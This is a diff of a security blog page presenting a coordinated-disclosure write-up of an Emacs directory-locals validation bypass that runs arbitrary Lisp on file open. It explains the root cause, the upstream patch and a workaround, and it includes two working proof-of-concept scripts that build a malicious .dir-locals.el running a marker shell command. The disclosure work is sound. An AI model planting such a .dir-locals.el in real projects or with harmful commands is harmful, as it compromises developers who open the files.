@@ -2,32 +2,263 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Code Execution Through Emacs Directory Locals | X3r0Day</title>
-    <meta name="description" content="How an Emacs directory-local auto-mode-alist validation bypass executed code on file open in 31.1 and pre-fix 32.0.50 builds, and how upstream fixed it for 31.2.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#1c1d20">
+    <title>Emacs: code execution on file open | X3r0Day</title>
+    <meta name="description" content="An ordinary file. An unexpected execution path. How Emacs directory locals bypassed the very check meant to keep them safe.">
     <meta name="author" content="X3r0Day">
+    <meta property="og:title" content="Emacs: code execution on file open">
+    <meta property="og:description" content="An ordinary file. An unexpected execution path. How Emacs directory locals bypassed the very check meant to keep them safe.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://x3r0day.me/blog/emacs-dir-locals-code-execution/">
     <link rel="canonical" href="https://x3r0day.me/blog/emacs-dir-locals-code-execution/">
-    <link rel="stylesheet" href="/style.css">
-    <link rel="stylesheet" href="/blog/blog.css">
-    <script defer src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+    <link rel="preload" href="/assets/fonts/fragment-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/assets/fonts/silkscreen-400-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="/style.css?v=b345641a10a2">
+    <link rel="stylesheet" href="/blog/blog.css?v=e6cf661b0258">
+    <script defer src="/script.js?v=31e9c72a52f7"></script>
     <script defer src="/blog/blog.js"></script>
 </head>
-<body class="blog-page">
-    <main class="window outset blog-window">
-        <div class="title-bar">
-            <div class="title-text"><span aria-hidden="true">📝</span> Emacs Dir Locals Code Execution.md - Notepad</div>
-        </div>
-        <nav class="menu-bar" aria-label="Site navigation">
-            <a href="/blog/">All posts</a>
-            <a href="/">Home</a>
-        </nav>
-        <article class="inset" id="notepad-content" aria-live="polite" aria-busy="true">
-            <p>Loading post...</p>
-            <noscript><p>Enable JavaScript to view the formatted post, or read the Markdown file below.</p></noscript>
-        </article>
-        <footer class="menu-bar">
-            <a id="post-source" href="/blog/writeups/Emacs%20Dir%20Locals%20Code%20Execution.md">Read Markdown</a>
-        </footer>
-    </main>
+<body class="reading-page">
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header"><div class="header-inner wrap">
+    <a class="brand" href="/" aria-label="X3r0Day home">X3r0Day<span class="brand-suffix">Research &amp; notes</span></a>
+    <nav class="site-nav" id="site-nav" aria-label="Main navigation">
+        <a href="/">Research</a>
+        <a href="/blog/" aria-current="page">Writeups</a>
+        <a href="/#tools">Projects</a><a href="/#about">About</a>
+    </nav>
+    <div class="header-actions"><button class="search-trigger" type="button" aria-label="Search research" aria-controls="site-search" hidden><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></svg></button><button class="menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menu <span aria-hidden="true">+</span></button></div>
+</div></header>
+<div class="reading-progress" aria-hidden="true"></div>
+<main id="main" class="article-page wrap">
+    <header class="article-header"><a class="back-link" href="/blog/"><span aria-hidden="true">←</span> All writing</a><div class="article-meta"><span class="topic-tag iris">Editor security</span><span>November 12, 2026</span><span>8 min read</span></div><h1>Emacs: code execution on file open</h1><p class="article-dek">An ordinary file. An unexpected execution path. How Emacs directory locals bypassed the very check meant to keep them safe.</p><div class="article-byline"><span class="author-mark" aria-hidden="true">x3</span><span>Words &amp; research by <strong>X3r0Day</strong></span><a class="source-link" href="/blog/writeups/Emacs%20Dir%20Locals%20Code%20Execution.md">View Markdown ↗</a></div></header>
+    <div class="article-resources"><a href="https://www.openwall.com/lists/oss-security/2026/11/11/7">Upstream advisory ↗</a></div>
+    <div class="article-layout"><aside class="article-sidebar"><details class="toc" open><summary>In this article <span aria-hidden="true">⌄</span></summary><nav aria-label="Table of contents"><a href="#the-short-version">The short version</a><a href="#what-directory-locals-are-supposed-to-do">What directory locals are supposed to do</a><a href="#the-matcher-that-did-more-than-match">The matcher that did more than match</a><a href="#why-the-payload-needs-two-entries">Why the payload needs two entries</a><a href="#poc-1-an-ordinary-markdown-file">PoC 1: an ordinary Markdown file</a><a href="#poc-2-turning-the-opened-buffer-into-code">PoC 2: turning the opened buffer into code</a><a href="#what-was-tested-and-what-the-impact-was">What was tested, and what the impact was</a><a href="#how-the-regression-happened">How the regression happened</a><a href="#what-the-patch-changes">What the patch changes</a><a href="#fix-and-temporary-workaround">Fix and temporary workaround</a><a href="#disclosure-timeline">Disclosure timeline</a><a href="#references">References</a></nav></details></aside><article class="prose" id="post-content"><p>I found a validation bypass in GNU Emacs that let a project&#39;s <code>.dir-locals.el</code> execute arbitrary Emacs Lisp when a matching file was opened. The file itself could be an ordinary Markdown README. No evaluation command, local-variable approval, or trust prompt was needed.</p>
+<p>The issue affected Emacs 31.1 and the pre-fix 32.0.50 development builds I tested. Emacs 30.2 is unaffected. Upstream disclosed the vulnerability on November 11, credited the discovery to X3r0Day, and published Stefan Monnier&#39;s patch. Sean Whitton subsequently confirmed that the fix was on the release branch, with the bug marked fixed in version 31.2.</p>
+<p><strong>Patch status:</strong> the fix is available upstream. The <a href="https://www.openwall.com/lists/oss-security/2026/11/11/7">November 11 announcement</a> described 31.2 as an upcoming release; a fixed release branch is not the same thing as an already-shipped release. The <a href="https://debbugs.gnu.org/82213">public bug report, #82213</a>, contains the original report, patch, and release-branch confirmation.</p>
+<h2 id="the-short-version">The short version</h2>
+<p>The attack needed two files in an attacker-controlled project:</p>
+<pre><code class="language-text">project/
+├── .dir-locals.el
+└── README.md
+</code></pre>
+<p>The README did not need to contain executable content. The payload could live entirely in <code>.dir-locals.el</code>, disguised as an entry in the directory-local <code>auto-mode-alist</code>.</p>
+<p>Opening the README caused Emacs to select its major mode. During that selection, an internal matching helper called an attacker-supplied function <strong>before</strong> the caller checked whether the function was allowed.</p>
+<p>The final mode was harmless. The earlier function was not.</p>
+<p>One terminology point: the original research called this a &quot;0-click&quot; issue because execution required no extra confirmation after opening the file. The user still had to open a matching file in the project. More precisely, this was <strong>arbitrary code execution on file open, without a trust prompt</strong>, under the privileges of the Emacs process.</p>
+<h2 id="what-directory-locals-are-supposed-to-do">What directory locals are supposed to do</h2>
+<p>Emacs projects can use <code>.dir-locals.el</code> to configure editing behavior for files in a directory tree: indentation, formatting, and other project-specific settings.</p>
+<p>There is also a special <code>auto-mode-alist</code> entry that lets a directory choose major modes based on filenames. That matters because choosing a major mode means calling a function. Emacs therefore has a dedicated check for functions supplied through this path:</p>
+<pre><code class="language-elisp">(defun set-auto-mode--dir-local-valid-p (mode)
+  &quot;Say whether MODE can be used in a .dir-local.el `auto-mode-alist&#39;.&quot;
+  (and (symbolp mode)
+       (string-suffix-p &quot;-mode&quot; (symbol-name mode))
+       (commandp mode)
+       (not (provided-mode-derived-p mode &#39;special-mode))))
+</code></pre>
+<p>An arbitrary lambda does not pass that check. Neither does <code>eval-buffer</code>.</p>
+<p>This was not a normal directory-local <code>eval</code> setting. <code>set-auto-mode</code> extracted the special <code>auto-mode-alist</code> key through <code>hack-dir-local--get-variables</code>, outside the ordinary risky-variable approval flow. That path relied on the mode-function check. Bypassing it did not produce a second approval prompt later.</p>
+<p>The check was not missing. It was in the wrong place for one execution path.</p>
+<h2 id="the-matcher-that-did-more-than-match">The matcher that did more than match</h2>
+<p>The relevant file-opening path was:</p>
+<pre><code class="language-text">find-file
+  normal-mode
+    set-auto-mode
+      read the directory-local auto-mode-alist
+      set-auto-mode--apply-alist
+        set-auto-mode--find-matching-alist-entry
+</code></pre>
+<p>The caller asked the helper to find a mode, then validated the result:</p>
+<pre><code class="language-elisp">(setq mode (set-auto-mode--find-matching-alist-entry
+            alist name case-insensitive-p))
+(when (and dir-local mode
+           (not (set-auto-mode--dir-local-valid-p mode)))
+  (message &quot;Ignoring invalid mode `%S&#39;&quot; mode)
+  (setq mode nil))
+(when mode
+  (set-auto-mode-0 mode keep-mode-if-same)
+  t)
+</code></pre>
+<p>That looks reasonable if the helper only returns a value. But <code>auto-mode-alist</code> supports more than the usual <code>(REGEXP . MODE)</code> entry. It also accepts:</p>
+<pre><code class="language-elisp">(REGEXP FUNCTION NON-NIL)
+</code></pre>
+<p>This form calls a function, removes the matching suffix from the filename, and continues searching for another match.</p>
+<p>In the vulnerable implementation, the helper remembered the first function and ran it when it found the next matching entry:</p>
+<pre><code class="language-elisp">(when newmode
+  (when mode
+    (set-auto-mode-0 mode t))
+  (setq mode newmode))
+</code></pre>
+<p>That <code>set-auto-mode-0</code> call happened inside the helper. It did not perform the directory-local validity check first.</p>
+<p>By the time execution returned to the caller, the untrusted function had already run. Validating the final return value could not undo it.</p>
+<h2 id="why-the-payload-needs-two-entries">Why the payload needs two entries</h2>
+<p>Here is the directory-local configuration from the lambda variant:</p>
+<pre><code class="language-elisp">((auto-mode-alist . ((&quot;&quot; . fundamental-mode)
+                     (&quot;\\.md\\&#39;&quot; (lambda ()
+                                   (shell-command &quot;id &gt; pwned&quot;))
+                                 t))))
+</code></pre>
+<p>There are two details that make this work.</p>
+<p>First, the matcher needs another match before it executes the function it remembered from the multi-mode entry. The empty regular expression is a catch-all. After the <code>.md</code> suffix is removed, it still matches and supplies <code>fundamental-mode</code> as the final result.</p>
+<p>Second, directory-local collection reverses these entries before matching. The catch-all is written first in <code>.dir-locals.el</code> so that the malicious <code>.md</code> entry is considered first by the matcher.</p>
+<p>For <code>README.md</code>, the sequence is:</p>
+<ol>
+<li>Match the <code>.md</code> entry and remember its lambda.</li>
+<li>Remove the matching <code>.md</code> suffix from the filename being examined.</li>
+<li>Find the catch-all entry.</li>
+<li>Execute the remembered lambda inside the helper, without validating it.</li>
+<li>Return <code>fundamental-mode</code> to the caller.</li>
+<li>Validate <code>fundamental-mode</code>, which passes.</li>
+</ol>
+<p>The function that needed checking was not the function the caller eventually checked.</p>
+<h2 id="poc-1-an-ordinary-markdown-file">PoC 1: an ordinary Markdown file</h2>
+<p>This reproducer uses the original marker command, <code>id &gt; pwned</code>. The command writes the current process identity to a local file; it does not need a network connection.</p>
+<pre><code class="language-sh">workdir=&quot;$(mktemp -d)&quot;
+cd &quot;$workdir&quot; || exit 1
+
+cat &gt; .dir-locals.el &lt;&lt;&#39;EOF&#39;
+((auto-mode-alist . ((&quot;&quot; . fundamental-mode)
+                     (&quot;\\.md\\&#39;&quot; (lambda ()
+                                   (shell-command &quot;id &gt; pwned&quot;))
+                                 t))))
+EOF
+
+cat &gt; README.md &lt;&lt;&#39;EOF&#39;
+# Project notes
+
+This is an ordinary Markdown document. It contains no Lisp.
+EOF
+
+emacs -Q --batch --eval &#39;(find-file &quot;README.md&quot;)&#39;
+cat pwned
+</code></pre>
+<p>On the vulnerable builds, opening the README created <code>pwned</code> in the project directory with output such as:</p>
+<pre><code class="language-text">uid=1000(user) gid=1000(user) groups=1000(user),...
+</code></pre>
+<p>The interactive equivalent was:</p>
+<pre><code class="language-sh">emacs -nw -Q README.md
+</code></pre>
+<p>Execution occurred during file opening, before the buffer was displayed, without answering a prompt. <code>-Q</code> did not prevent it: skipping personal initialization files does not disable this directory-local processing path.</p>
+<p>This is the more revealing variant. Reading only the README would not expose the payload, because the executable part was in the project&#39;s editor configuration.</p>
+<h2 id="poc-2-turning-the-opened-buffer-into-code">PoC 2: turning the opened buffer into code</h2>
+<p>The function slot did not have to contain a lambda. It could also name <code>eval-buffer</code>:</p>
+<pre><code class="language-elisp">((auto-mode-alist . ((&quot;&quot; . fundamental-mode)
+                     (&quot;\\.md\\&#39;&quot; eval-buffer t))))
+</code></pre>
+<p>In this variant, the README contained Lisp rather than an ordinary Markdown document:</p>
+<pre><code class="language-sh">workdir=&quot;$(mktemp -d)&quot;
+cd &quot;$workdir&quot; || exit 1
+
+cat &gt; .dir-locals.el &lt;&lt;&#39;EOF&#39;
+((auto-mode-alist . ((&quot;&quot; . fundamental-mode)
+                     (&quot;\\.md\\&#39;&quot; eval-buffer t))))
+EOF
+
+cat &gt; README.md &lt;&lt;&#39;EOF&#39;
+(shell-command &quot;id &gt; pwned&quot;)
+;;
+;; # Project notes
+;; The remaining lines are Lisp comments.
+EOF
+
+emacs -Q --batch --eval &#39;(find-file &quot;README.md&quot;)&#39;
+cat pwned
+</code></pre>
+<p>The result was the same marker file. Here, selecting a mode caused Emacs to evaluate the opened buffer as Lisp. <code>eval-buffer</code> should have been rejected by the directory-local validation, but the early call never went through it.</p>
+<p>Both variants were included in the <a href="https://debbugs.gnu.org/82213#5">original report</a>.</p>
+<h2 id="what-was-tested-and-what-the-impact-was">What was tested, and what the impact was</h2>
+<p>The pre-fix research tests reproduced both variants on Linux in batch mode and interactive TTY sessions:</p>
+<table>
+<thead>
+<tr>
+<th>Build</th>
+<th>Recorded result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Emacs 31.1, Arch package <code>31.1-2</code></td>
+<td>Both variants reproduced</td>
+</tr>
+<tr>
+<td>Emacs 32.0.50, development build from November 9, 2026</td>
+<td>Both variants reproduced</td>
+</tr>
+<tr>
+<td>Emacs 30.2</td>
+<td>Unaffected, as confirmed by upstream</td>
+</tr>
+</tbody></table>
+<p>The 32.0.50 result refers to the development snapshot tested before the fix, not every build carrying that development version string. GUI file opening uses the same mode-selection path, but the recorded runtime tests were batch and TTY.</p>
+<p>The attacker needed control of a project directory containing <code>.dir-locals.el</code>, and the user needed to open a matching file beneath it. Since directory-local settings can apply to descendant directories, putting the configuration at a repository root could affect matching files further down the tree.</p>
+<p>Unlike the <a href="/blog/fsmonitor-lrce/">Git FSMonitor workspace-poisoning issue</a>, this did not require shipping a preconfigured <code>.git</code> directory. A tracked <code>.dir-locals.el</code> can arrive through an ordinary clone. Cloning alone was not the trigger; opening a matching file afterward was.</p>
+<p>The marker command demonstrated shell execution with the user&#39;s privileges. This was not a privilege-escalation primitive by itself, and it did not require the README to contain code in the lambda variant.</p>
+<h2 id="how-the-regression-happened">How the regression happened</h2>
+<p>The <a href="https://debbugs.gnu.org/82213#5">original report</a> traces the behavior through three changes:</p>
+<ul>
+<li><code>ad5faa424a</code>, July 23, 2021: added directory-local <code>auto-mode-alist</code> support.</li>
+<li><code>9ac6ff53b1</code>, July 24, 2021: tightened validation to reject arbitrary functions through that feature.</li>
+<li><code>504bdce731</code>, February 16, 2025: fixed multi-mode matching behavior for bug #75961 by making the remembered function actually run.</li>
+</ul>
+<p>The 2021 validation tests covered ordinary entries containing an arbitrary symbol, a lambda, and <code>dired-mode</code>. The later multi-mode behavior introduced a call inside the matcher, outside that validation boundary.</p>
+<p>The gap was not that an invalid function passed the predicate. It was that this execution path never asked the predicate about that function.</p>
+<h2 id="what-the-patch-changes">What the patch changes</h2>
+<p>Stefan Monnier&#39;s <a href="https://www.openwall.com/lists/oss-security/2026/11/11/7">published patch</a> replaces <code>set-auto-mode--find-matching-alist-entry</code> with <code>set-auto-mode--from-matching-alist-entry</code> and passes the directory-local context into it.</p>
+<p>Instead of checking only the final result in the caller, the matcher validates each selected function before executing it:</p>
+<pre><code class="language-elisp">(when newmode
+  (if (and dir-local
+           (not (set-auto-mode--dir-local-valid-p mode)))
+      (message &quot;Ignoring invalid mode `%S&#39;&quot; mode)
+    (set-auto-mode-0 mode keep-mode-if-same)
+    (setq was-set t))
+  mode-t)
+</code></pre>
+<p>The important change is the ordering. In the directory-local path, the validity check now guards the call that actually executes the selected function, including intermediate functions in multi-mode entries. A harmless final mode no longer hides an earlier unvalidated call.</p>
+<h2 id="fix-and-temporary-workaround">Fix and temporary workaround</h2>
+<p>Use an Emacs package or source build containing the upstream fix. The tracker identifies 31.2 as the fixed version, and the announcement says the patch is intended for that release. For distribution packages, check whether the fix has been backported rather than relying only on the upstream version number.</p>
+<p>The workaround recorded in my report was to disable directory-local variables before opening an untrusted project:</p>
+<pre><code class="language-elisp">(setq enable-dir-local-variables nil)
+</code></pre>
+<p>That blocked both PoCs in the original testing, but also disables legitimate directory-local settings. It is a workaround, not a replacement for installing the fix.</p>
+<h2 id="disclosure-timeline">Disclosure timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>November 10, 2026</td>
+<td>Report recorded as GNU Emacs bug #82213.</td>
+</tr>
+<tr>
+<td>November 11, 2026</td>
+<td>Sean Whitton published the oss-security advisory, crediting X3r0Day and attaching Stefan Monnier&#39;s patch.</td>
+</tr>
+<tr>
+<td>November 11, 2026</td>
+<td>Sean confirmed the release-branch fix; the tracker marked the issue fixed in 31.2.</td>
+</tr>
+<tr>
+<td>November 12, 2026</td>
+<td>This writeup published.</td>
+</tr>
+</tbody></table>
+<p>Thanks to Stefan Monnier for the fix and Sean Whitton for the disclosure and release-branch confirmation.</p>
+<p>The lesson here is narrower than &quot;project configuration can be dangerous.&quot; Emacs already had a rule against this exact kind of directory-local function execution. A later change introduced a side effect inside a helper, and the caller&#39;s validation still protected only the returned value. The execution boundary moved; the check did not.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.openwall.com/lists/oss-security/2026/11/11/7">oss-security: Emacs .dir-locals.el arbitrary code execution, November 11, 2026</a></li>
+<li><a href="https://debbugs.gnu.org/82213">GNU Emacs bug #82213: original report, PoCs, patch, and discussion</a></li>
+<li><a href="https://debbugs.gnu.org/82213#13">Release-branch fix confirmation, message #13</a></li>
+</ul>
+</article></div>
+    <div class="article-end"><span>Thanks for reading.</span><a class="text-link" href="/blog/">Back to all writing <span aria-hidden="true">↗</span></a></div>
+    <a class="next-post peach" href="/blog/hermes-agent-unauth-rce/"><div><span>Keep reading</span><h2>Hermes Agent: unauthenticated RCE</h2></div><span aria-hidden="true">↗</span></a>
+</main>
+<footer class="site-footer wrap"><a class="footer-name" href="/">X3r0Day<span> / independent research</span></a><div><a href="https://github.com/X3r0Day">GitHub ↗</a><a href="https://x.com/X3r0DaySec">X / Twitter ↗</a><a href="mailto:cr4n@duck.com">Email ↗</a></div><span>© 2026</span></footer>
+<dialog id="site-search" class="search-dialog" aria-labelledby="search-title"><div class="search-dialog-heading"><h2 id="search-title">Search the index.</h2><button type="button" class="search-close" aria-label="Close search">×</button></div><label class="sr-only" for="site-query">Search research and projects</label><input id="site-query" type="search" placeholder="A finding, a tool, a question…" autocomplete="off" autofocus><p class="search-status" role="status"></p><ul class="search-results"><li data-search="emacs: code execution on file open an ordinary file. an unexpected execution path. how emacs directory locals bypassed the very check meant to keep them safe. editor security"><a href="/blog/emacs-dir-locals-code-execution/"><span>Editor security</span><strong>Emacs: code execution on file open</strong><span aria-hidden="true">↗</span></a></li><li data-search="hermes agent: unauthenticated rce an exposed session token in hermes agent turns a dashboard visit into unauthenticated code execution and credential access. application security"><a href="/blog/hermes-agent-unauth-rce/"><span>Application security</span><strong>Hermes Agent: unauthenticated RCE</strong><span aria-hidden="true">↗</span></a></li><li data-search="bun install: arbitrary file write a dependency alias takes bun outside node_modules. arbitrary file writes, even with lifecycle scripts disabled. supply chain"><a href="/blog/bun-file-traversal/"><span>Supply chain</span><strong>Bun install: arbitrary file write</strong><span aria-hidden="true">↗</span></a></li><li data-search="git fsmonitor: workspace poisoning when git-aware editors trust a poisoned workspace, a routine status check can become local code execution. developer tooling"><a href="/blog/fsmonitor-lrce/"><span>Developer tooling</span><strong>Git FSMonitor: workspace poisoning</strong><span aria-hidden="true">↗</span></a></li><li data-search="insect v2 an earlier red-team project revisiting 1990s malware, preserved from the original research collection. red-team research"><a href="https://github.com/X3r0Day/FUD-C2-Framework.git"><span>Red-team research</span><strong>Insect V2</strong><span aria-hidden="true">↗</span></a></li><li data-search="workspace trust &amp; python .pth files the research collection covering vs code python initialization and git fsmonitor workspace poisoning. developer tooling"><a href="https://github.com/X3r0Day/X3r0Day-Research"><span>Developer tooling</span><strong>Workspace trust &amp; Python .pth files</strong><span aria-hidden="true">↗</span></a></li><li data-search="a data-exposure disclosure to cert-in a coordinated report concerning exposed personal data on an indian government website. responsible disclosure"><a href="https://x.com/X3r0DaySec/status/2063002547561115826"><span>Responsible disclosure</span><strong>A data-exposure disclosure to CERT-In</strong><span aria-hidden="true">↗</span></a></li></ul><p class="search-empty" hidden>No matches. Try a different word.</p><div class="search-dialog-foot"><span>Research, not a search engine.</span><span>Esc to close</span></div></dialog>
 </body>
 </html>
